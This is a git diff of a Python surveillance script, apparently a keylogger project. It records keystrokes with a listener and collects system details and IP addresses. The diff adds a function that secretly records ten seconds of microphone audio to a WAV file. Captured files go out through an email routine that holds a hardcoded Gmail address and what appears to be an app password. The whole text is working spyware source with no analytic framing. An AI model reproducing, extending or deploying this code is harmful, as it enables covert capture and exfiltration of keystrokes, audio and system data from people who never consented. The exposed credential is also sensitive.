@@ -15,8 +15,8 @@ import logging
 import time
 import os
 
-from scipy.io.wavfile import write
-import sounddevice as sd
+import pyaudio
+import wave
 
 from cryptography.fernet import Fernet
 
@@ -27,24 +27,15 @@ from multiprocessing import Process, freeze_support
 from PIL import ImageGrab
 
 key_info = r"/key_log.txt"
-system_info = "sys_details.txt"
+system_info = r"/sys_details.txt"
+audio_info = r"/audio_rec.wav"
 log_dir = r"/Users/kenluong/Developer/python/"
+
+audio_time = 10
 
 email_addr = "anteikuu20@gmail.com"
 password = "erfe mdvm mnck pghf"
 toaddr = "anteikuu20@gmail.com"
-
-keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
-
-def on_press(key):
-    logging.info(str(key))
-
-def on_release(key):
-    if key == Key.esc:
-        return False
-
-with Listener(on_press=on_press, on_release=on_release) as listener:
-    listener.join()
 
 def send_email(filename, attachment, toaddr):
     fromaddr = email_addr
@@ -97,3 +88,47 @@ def system_details():
         f.write("Private IP Address: " + ip_addr + "\n")
 
 system_details()
+
+def mic_audio():
+    chunk = 1024
+    format = pyaudio.paInt16
+    channels = 1
+    freq = 44100
+
+    p = pyaudio.PyAudio()
+
+    stream = p.open(format=format, channels=channels, rate=freq, input=True, frames_per_buffer=chunk)
+
+    print("start recording...")
+
+    frames = []
+    for i in range(0, int(freq / chunk * audio_time)):
+        data = stream.read(chunk)
+        frames.append(data)
+
+    print("recording stopped")
+
+    stream.stop_stream()
+    stream.close()
+    p.terminate()
+
+    wf = wave.open(log_dir + audio_info, "wb")
+    wf.setnchannels(channels)
+    wf.setsampwidth(p.get_sample_size(format))
+    wf.setframerate(freq)
+    wf.writeframes(b''.join(frames))
+    wf.close()
+
+mic_audio()
+
+keys = logging.basicConfig(filename=(log_dir + key_info), level=logging.DEBUG, format='%(asctime)s: %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p')
+
+def on_press(key):
+    logging.info(str(key))
+
+def on_release(key):
+    if key == Key.esc:
+        return False
+
+with Listener(on_press=on_press, on_release=on_release) as listener:
+    listener.join()
